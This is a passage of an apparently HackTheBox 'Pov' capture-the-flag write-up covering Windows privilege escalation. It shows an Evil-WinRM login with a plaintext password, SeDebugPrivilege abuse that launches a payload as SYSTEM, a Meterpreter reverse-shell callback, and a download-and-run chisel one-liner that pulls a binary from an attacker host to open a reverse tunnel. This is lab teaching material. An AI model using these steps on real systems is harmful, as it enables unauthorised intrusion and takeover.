+Interact with a module by name or index. For example info 1, use 1 or use auxiliary/server/socks_unc
+
+msf auxiliary(server/socks_proxy) &gt; use 0
+msf auxiliary(server/socks_proxy) &gt; show options
+
+Module options (auxiliary/server/socks_proxy):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVHOST  127.0.0.1        yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT  9050             yes       The port to listen on
+   SRVSSL   false            no        Negotiate SSL/TLS for local server connections
+   VERSION  5                yes       The SOCKS version to use (Accepted: 4a, 5)
+
+
+   When VERSION is 5:
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   PASSWORD                   no        Proxy password for SOCKS5 listener
+   USERNAME                   no        Proxy username for SOCKS5 listener
+
+
+Auxiliary action:
+
+   Name   Description
+   ----   -----------
+   Proxy  Run a SOCKS proxy server
+
+
+
+View the full module info with the info, or info -d command.
+
+msf auxiliary(server/socks_proxy) &gt; run -j
+[*] Auxiliary module running as background job 3.
+</code></pre></div></div>
+
+<h3 id="-step-322-exploiting-sedebugprivilege">⚡ Step 3.2.2: Exploiting <code class="language-plaintext highlighter-rouge">SeDebugPrivilege</code></h3>
+
+<p>Connect via proxychains and <code class="language-plaintext highlighter-rouge">evil-winrm</code> to obtain a <code class="language-plaintext highlighter-rouge">High-Integrity</code> shell.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>proxychains <span class="nt">-q</span> evil-winrm <span class="nt">-i</span> pov.htb <span class="nt">-u</span> alaading <span class="nt">-p</span> f8gQ8fynP44ek1m3
+
+Evil-WinRM shell v3.9
+
+Warning: Remote path completions is disabled due to ruby limitation: undefined method <span class="sb">`</span>quoting_detection_proc<span class="s1">' for module Reline
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\alaading\Documents&gt; whoami
+pov\alaading
+*Evil-WinRM* PS C:\Users\alaading\Documents&gt; whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeDebugPrivilege              Debug programs                 Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+</span></code></pre></div></div>
+
+<p>A check confirms the <strong>High Mandatory Level</strong>, making the privilege fully usable (which already is <strong>Enabled</strong>):</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\alaading\Desktop</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">whoami</span><span class="w"> </span><span class="nx">/groups</span><span class="w">
+
+</span><span class="n">GROUP</span><span class="w"> </span><span class="nx">INFORMATION</span><span class="w">
+</span><span class="o">-----------------</span><span class="w">
+
+</span><span class="n">Group</span><span class="w"> </span><span class="nx">Name</span><span class="w">                           </span><span class="nx">Type</span><span class="w">             </span><span class="nx">SID</span><span class="w">          </span><span class="nx">Attributes</span><span class="w">
+</span><span class="o">====================================</span><span class="w"> </span><span class="o">================</span><span class="w"> </span><span class="o">============</span><span class="w"> </span><span class="o">==================================================</span><span class="w">
+</span><span class="n">Everyone</span><span class="w">                             </span><span class="nx">Well-known</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="nx">S-1-1-0</span><span class="w">      </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
+</span><span class="n">BUILTIN\Remote</span><span class="w"> </span><span class="nx">Management</span><span class="w"> </span><span class="nx">Users</span><span class="w">      </span><span class="nx">Alias</span><span class="w">            </span><span class="nx">S-1-5-32-580</span><span class="w"> </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
+</span><span class="n">BUILTIN\Users</span><span class="w">                        </span><span class="nx">Alias</span><span class="w">            </span><span class="nx">S-1-5-32-545</span><span class="w"> </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
+</span><span class="n">NT</span><span class="w"> </span><span class="nx">AUTHORITY\NETWORK</span><span class="w">                 </span><span class="nx">Well-known</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="nx">S-1-5-2</span><span class="w">      </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
+</span><span class="n">NT</span><span class="w"> </span><span class="nx">AUTHORITY\Authenticated</span><span class="w"> </span><span class="nx">Users</span><span class="w">     </span><span class="nx">Well-known</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="nx">S-1-5-11</span><span class="w">     </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
+</span><span class="n">NT</span><span class="w"> </span><span class="nx">AUTHORITY\This</span><span class="w"> </span><span class="nx">Organization</span><span class="w">       </span><span class="nx">Well-known</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="nx">S-1-5-15</span><span class="w">     </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
+</span><span class="n">NT</span><span class="w"> </span><span class="nx">AUTHORITY\Local</span><span class="w"> </span><span class="nx">account</span><span class="w">           </span><span class="nx">Well-known</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="nx">S-1-5-113</span><span class="w">    </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
+</span><span class="n">NT</span><span class="w"> </span><span class="nx">AUTHORITY\NTLM</span><span class="w"> </span><span class="nx">Authentication</span><span class="w">     </span><span class="nx">Well-known</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="nx">S-1-5-64-10</span><span class="w">  </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
+</span><span class="n">Mandatory</span><span class="w"> </span><span class="nx">Label\High</span><span class="w"> </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">Level</span><span class="w"> </span><span class="nx">Label</span><span class="w">            </span><span class="nx">S-1-16-12288</span><span class="w">
+</span></code></pre></div></div>
+
+<p>We now use <code class="language-plaintext highlighter-rouge">psgetsys.ps1</code> to attach to a <code class="language-plaintext highlighter-rouge">SYSTEM</code> process. We choose <code class="language-plaintext highlighter-rouge">winlogon.exe</code> (PID <code class="language-plaintext highlighter-rouge">536</code>), as it consistently runs as <code class="language-plaintext highlighter-rouge">SYSTEM</code>.</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\alaading\Desktop</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">ps</span><span class="w">
+
+</span><span class="err">&lt;</span><span class="n">SNIP</span><span class="err">&gt;</span><span class="w">
+
+    </span><span class="mi">172</span><span class="w">      </span><span class="mi">11</span><span class="w">     </span><span class="mi">1380</span><span class="w">       </span><span class="mi">6480</span><span class="w">       </span><span class="mf">0.11</span><span class="w">    </span><span class="mi">500</span><span class="w">   </span><span class="mi">0</span><span class="w"> </span><span class="n">wininit</span><span class="w">
+    </span><span class="nx">255</span><span class="w">      </span><span class="nx">12</span><span class="w">     </span><span class="nx">2652</span><span class="w">      </span><span class="nx">15800</span><span class="w">       </span><span class="nx">0.25</span><span class="w">    </span><span class="nx">536</span><span class="w">   </span><span class="nx">1</span><span class="w"> </span><span class="nx">winlogon</span><span class="w"> </span><span class="err">&lt;</span><span class="o">-</span><span class="w"> </span><span class="nx">this</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">enough</span><span class="w">
+    </span><span class="mi">353</span><span class="w">      </span><span class="mi">16</span><span class="w">    </span><span class="mi">15072</span><span class="w">      </span><span class="mi">25140</span><span class="w">       </span><span class="mf">9.59</span><span class="w">   </span><span class="mi">3880</span><span class="w">   </span><span class="mi">0</span><span class="w"> </span><span class="n">WmiPrvSE</span><span class="w">
+    </span><span class="nx">526</span><span class="w">      </span><span class="nx">25</span><span class="w">    </span><span class="nx">51276</span><span class="w">      </span><span class="nx">67148</span><span class="w">       </span><span class="nx">0.30</span><span class="w">    </span><span class="nx">696</span><span class="w">   </span><span class="nx">0</span><span class="w"> </span><span class="nx">wsmprovhost</span><span class="w">
+    </span><span class="mi">658</span><span class="w">      </span><span class="mi">25</span><span class="w">    </span><span class="mi">51760</span><span class="w">      </span><span class="mi">67684</span><span class="w">       </span><span class="mf">0.27</span><span class="w">   </span><span class="mi">2104</span><span class="w">   </span><span class="mi">0</span><span class="w"> </span><span class="n">wsmprovhost</span><span class="w">
+    </span><span class="nx">495</span><span class="w">      </span><span class="nx">26</span><span class="w">    </span><span class="nx">47812</span><span class="w">      </span><span class="nx">61356</span><span class="w">       </span><span class="nx">0.20</span><span class="w">   </span><span class="nx">3432</span><span class="w">   </span><span class="nx">0</span><span class="w"> </span><span class="nx">wsmprovhost</span><span class="w">
+   </span><span class="mi">1040</span><span class="w">      </span><span class="mi">29</span><span class="w">    </span><span class="mi">63748</span><span class="w">      </span><span class="mi">82068</span><span class="w">       </span><span class="mf">0.50</span><span class="w">   </span><span class="mi">3932</span><span class="w">   </span><span class="mi">0</span><span class="w"> </span><span class="n">wsmprovhost</span><span class="w">
+
+
+</span><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\alaading\Desktop</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">import-module</span><span class="w"> </span><span class="o">.</span><span class="nx">/psgetsys.ps1</span><span class="w">
+</span><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\alaading\Desktop</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">ImpersonateFromParentPid</span><span class="w"> </span><span class="nt">-ppid</span><span class="w"> </span><span class="nx">536</span><span class="w"> </span><span class="nt">-command</span><span class="w"> </span><span class="s2">"C:\Windows\Temp\m.exe"</span><span class="w">
+</span><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\alaading\Desktop</span><span class="err">&gt;</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="-step-323-catching-the-system-shell">🚩 Step 3.2.3: Catching the SYSTEM Shell</h3>
+
+<p>The listener catches the callback, giving us full control:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>^Z
+Background channel 22? [y/N]  y
+meterpreter &gt; bg
+[*] Backgrounding session 2...
+msf exploit(multi/handler) &gt; run
+[*] Started reverse TCP handler on 10.10.14.219:9901
+[*] Sending stage (248902 bytes) to 10.129.44.96
+[*] Sending stage (248902 bytes) to 10.129.44.96
+[*] Meterpreter session 3 opened (10.10.14.219:9901 -&gt; 10.129.44.96:49765) at 2026-05-12 21:27:02 +0200
+
+msf exploit(multi/handler) &gt; sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                Connection
+  --  ----  ----                     -----------                ----------
+  1         meterpreter x64/windows  POV\sfitz @ POV            10.10.14.219:9901 -&gt; 10.129.44.96:49769 (10.129.44.96)
+  2         meterpreter x64/windows  POV\alaading @ POV         10.10.14.219:9901 -&gt; 10.129.44.96:49759 (10.129.44.96)
+  3         meterpreter x64/windows  POV\sfitz @ POV            10.10.14.219:9901 -&gt; 10.129.44.96:49765 (10.129.44.96)
+  4         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ POV  10.10.14.219:9901 -&gt; 10.129.44.96:49775 (10.129.44.96)
+
+msf exploit(multi/handler) &gt; sessions -i 4
+[*] Starting interaction with 4...
+
+meterpreter &gt; shell
+Process 4836 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.17763.5329]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt;type C:\Users\Administrator\Desktop\root.txt
+type C:\Users\Administrator\Desktop\root.txt
+[REDACTED]
+</code></pre></div></div>
+
+<p>Here we go!</p>
+
+<h4 id="option-b-chisel-the-reliable-way">Option B: Chisel (The Reliable Way)</h4>
+
+<p>If the MSF proxy is unstable, use Chisel for a reverse tunnel:</p>
+
+<ol>
+  <li>Start the <code class="language-plaintext highlighter-rouge">chisel</code> server:
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>chisel server <span class="nt">--reverse</span> <span class="nt">-p</span> 11601
+2026/05/12 21:24:44 server: Reverse tunnelling enabled
+2026/05/12 21:24:44 server: Fingerprint Kyf8pF1raBLNjpWFfBLbzafDIBl/MSU4gOTTGv0c6u0<span class="o">=</span>
+2026/05/12 21:24:44 server: Listening on http://0.0.0.0:11601
+2026/05/12 21:25:04 server: session#1: Client version <span class="o">(</span>1.11.6<span class="o">)</span> differs from server version <span class="o">(</span>1.11.5-0kali1<span class="o">)</span>
+2026/05/12 21:25:04 server: session#1: tun: proxy#R:127.0.0.1:1080<span class="o">=&gt;</span>socks: Listening
+</code></pre></div>    </div>
+  </li>
+  <li>Download chisel on the client and then execute:
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\alaading\Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">iwr</span><span class="w"> </span><span class="nt">-uri</span><span class="w"> </span><span class="nx">http://10.10.14.219:1104/chisel-windows_amd64</span><span class="w"> </span><span class="nt">-outfile</span><span class="w"> </span><span class="nx">c.exe</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="o">.</span><span class="n">\c.exe</span><span class="w"> </span><span class="nx">client</span><span class="w"> </span><span class="nx">10.10.14.219:11601</span><span class="w"> </span><span class="nx">R:socks</span><span class="w">
+</span><span class="mi">2026</span><span class="n">/05/12</span><span class="w"> </span><span class="nx">12:25:03</span><span class="w"> </span><span class="nx">client:</span><span class="w"> </span><span class="nx">Connecting</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">ws://10.10.14.219:11601</span><span class="w">
+</span><span class="mi">2026</span><span class="n">/05/12</span><span class="w"> </span><span class="nx">12:25:04</span><span class="w"> </span><span class="nx">client:</span><span class="w"> </span><span class="nx">Connected</span><span class="w"> </span><span class="p">(</span><span class="n">Latency</span><span class="w"> </span><span class="nx">27.5736ms</span><span class="p">)</span><span class="w">
+</span></code></pre></div>    </div>
+  </li>
+  <li>Now connect:
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>proxychains <span class="nt">-q</span> evil-winrm <span class="nt">-i</span> pov.htb <span class="nt">-u</span> alaading <span class="nt">-p</span> f8gQ8fynP44ek1m3
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\a</span>laading<span class="se">\D</span>ocuments&gt; <span class="nb">whoami</span> /priv
+Privilege Name                Description                    State
+<span class="o">=============================</span> <span class="o">==============================</span> <span class="o">=======</span>
+SeDebugPrivilege              Debug programs                 Enabled
+</code></pre></div>    </div>
+  </li>
+</ol>
+
+<p>Works fine.</p>
+
+<hr />
+
+<h2 id="-retrospective">🧠 Retrospective</h2>
+
+<ul>
+  <li><strong>Learnings:</strong>
+    <ol>
+      <li><strong>ASP.NET Vulnerabilities:</strong> If you have read access to the <code class="language-plaintext highlighter-rouge">web.config</code>, you have a direct path to RCE by handing the application a malicious, hand-crafted <code class="language-plaintext highlighter-rouge">VIEWSTATE</code> parameter.</li>
+      <li><strong>SeDebugPrivilege:</strong> This privilege is essentially a shortcut to <code class="language-plaintext highlighter-rouge">SYSTEM</code>. It allows you to attach to any process token in memory. If you can debug, you can rule.</li>
+      <li><strong>Integrity Levels (UAC):</strong> The mere presence of a privilege in <code class="language-plaintext highlighter-rouge">whoami /priv</code> does not guarantee its usability. In a <code class="language-plaintext highlighter-rouge">Medium Integrity</code> shell, administrative privileges are “locked.” Moving to a <code class="language-plaintext highlighter-rouge">High Integrity</code> shell (via WinRM, RDP, or a UAC bypass) is mandatory to activate them.</li>
+      <li><strong>Impersonation Techniques:</strong> Launching a process using the Parent PID of a <code class="language-plaintext highlighter-rouge">SYSTEM</code> process is an elegant way to inherit its security context, provided you have the necessary debug rights to perform the handshake.</li>
+    </ol>
+  </li>
+</ul>
+
+</div>
+
+
+
+
+
+
+
+
+
+  
+
+  <style>
+    .tooltip { position: relative; display: inline-block; cursor: help; }
+    .tooltip .tooltiptext {
+      visibility: hidden; width: 200px; background-color: #1a1a1a; color: #fff;
+      text-align: left; border: 1px solid var(--accent); padding: 8px; position: absolute;
+      z-index: 10; bottom: 125%; left: 50%; margin-left: -100px; opacity: 0;
+      transition: opacity 0.3s; font-family: var(--font-mono); font-size: 0.65rem; line-height: 1.4;
+      pointer-events: none;
+    }
+    .tooltip:hover .tooltiptext,
+    .tooltip:focus .tooltiptext,
+    .tooltip:focus-within .tooltiptext { visibility: visible; opacity: 1; }
+  </style>
+
+  <div class="related-ctfs" style="margin-top: 4rem; border-top: 1px solid var(--border); padding-top: 2rem;">
+    <h3 style="color: var(--accent); margin-bottom: 1.5rem; font-family: var(--font-mono);">// SIMILAR_OPERATIONS</h3>
+    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 1.5rem;">
+      
+      
+        
+        
+        
+        
+        
+
+        
+        
+
+        <div class="related-card" style="border: 1px solid #222; background: #0a0a0a; display: flex; align-items: center; padding: 0.8rem; gap: 1rem; position: relative;">
+          
+          <div style="width: 60px; height: 60px; flex-shrink: 0;">
+            <img src="/assets/img/ctf/jeeves.png" style="width: 100%; height: 100%; object-fit: cover; opacity: 0.8;">
+          </div>
+
+          <div style="flex-grow: 1;">
+            <div style="display: flex; justify-content: space-between; font-family: var(--font-mono); font-size: 0.6rem;">
+              <span class="fg-dim">HACKTHEBOX</span>
+              <span style="color: #ffa500; font-weight: bold;">
+                MEDIUM
+              </span>
+            </div>
+            
+            <h4 style="margin: 3px 0;"><a href="/ctfs/htb-jeeves/" style="border: none; font-size: 0.95rem;">HackTheBox: Jeeves</a></h4>
+            
+            <div style="display: flex; align-items: center; gap: 10px; margin-top: 5px;">
+              <div style="width: 80px; height: 4px; background: #222; border-radius: 2px;">
+                <div style="width: 10%; height: 100%; background: var(--accent);"></div>
+              </div>
+              <span style="font-family: var(--font-mono); font-size: 0.6rem; color: var(--accent);">
+                10% MATCH
+              </span>
+              
+              <div class="tooltip">
+                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="opacity: 0.5; vertical-align: middle;"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="16" x2="12" y2="12"></line><line x1="12" y1="8" x2="12.01" y2="8"></line></svg>
+                <span class="tooltiptext">
+                  <strong style="color: var(--accent); display: block; margin-bottom: 5px;">SHARED_VECTORS:</strong>
+                  • Windows
+                </span>
+              </div>
+            </div>
+          </div>
+        </div>
+      
+        
+        
+        
+        
+        
+
+        
+        
+
+        <div class="related-card" style="border: 1px solid #222; background: #0a0a0a; display: flex; align-items: center; padding: 0.8rem; gap: 1rem; position: relative;">
+          
+          <div style="width: 60px; height: 60px; flex-shrink: 0;">
+            <img src="/assets/img/ctf/fluffy.png" style="width: 100%; height: 100%; object-fit: cover; opacity: 0.8;">
+          </div>
+
+          <div style="flex-grow: 1;">
+            <div style="display: flex; justify-content: space-between; font-family: var(--font-mono); font-size: 0.6rem;">
+              <span class="fg-dim">HACKTHEBOX</span>
+              <span style="color: #00ff00; font-weight: bold;">
+                EASY
+              </span>
+            </div>
+            
+            <h4 style="margin: 3px 0;"><a href="/ctfs/htb-fluffy/" style="border: none; font-size: 0.95rem;">HackTheBox: Fluffy</a></h4>
+            
+            <div style="display: flex; align-items: center; gap: 10px; margin-top: 5px;">
+              <div style="width: 80px; height: 4px; background: #222; border-radius: 2px;">
+                <div style="width: 10%; height: 100%; background: var(--accent);"></div>
+              </div>
+              <span style="font-family: var(--font-mono); font-size: 0.6rem; color: var(--accent);">
+                10% MATCH
+              </span>
+              
+              <div class="tooltip">
+                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="opacity: 0.5; vertical-align: middle;"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="16" x2="12" y2="12"></line><line x1="12" y1="8" x2="12.01" y2="8"></line></svg>
+                <span class="tooltiptext">
+                  <strong style="color: var(--accent); display: block; margin-bottom: 5px;">SHARED_VECTORS:</strong>
+                  • Windows
+                </span>
+              </div>
+            </div>
+          </div>
+        </div>
+      
+        
+        
+        
+        
+        
+
+        
+        
+
+        <div class="related-card" style="border: 1px solid #222; background: #0a0a0a; display: flex; align-items: center; padding: 0.8rem; gap: 1rem; position: relative;">
+          
+          <div style="width: 60px; height: 60px; flex-shrink: 0;">
+            <img src="/assets/img/ctf/overwatch.png" style="width: 100%; height: 100%; object-fit: cover; opacity: 0.8;">
+          </div>
+
+          <div style="flex-grow: 1;">
+            <div style="display: flex; justify-content: space-between; font-family: var(--font-mono); font-size: 0.6rem;">
+              <span class="fg-dim">HACKTHEBOX</span>
+              <span style="color: #ffa500; font-weight: bold;">
+                MEDIUM
+              </span>
+            </div>
+            
+            <h4 style="margin: 3px 0;"><a href="/ctfs/htb-overwatch/" style="border: none; font-size: 0.95rem;">HackTheBox: Overwatch</a></h4>
+            
+            <div style="display: flex; align-items: center; gap: 10px; margin-top: 5px;">
+              <div style="width: 80px; height: 4px; background: #222; border-radius: 2px;">
+                <div style="width: 10%; height: 100%; background: var(--accent);"></div>
+              </div>
+              <span style="font-family: var(--font-mono); font-size: 0.6rem; color: var(--accent);">
+                10% MATCH
+              </span>
+              
+              <div class="tooltip">
+                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="opacity: 0.5; vertical-align: middle;"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="16" x2="12" y2="12"></line><line x1="12" y1="8" x2="12.01" y2="8"></line></svg>
+                <span class="tooltiptext">
+                  <strong style="color: var(--accent); display: block; margin-bottom: 5px;">SHARED_VECTORS:</strong>
+                  • Windows
+                </span>
+              </div>
+            </div>
+          </div>
+        </div>
+      
+    </div>
+  </div>
+
+
+
+    </div>
+
+  </body>
+</html>
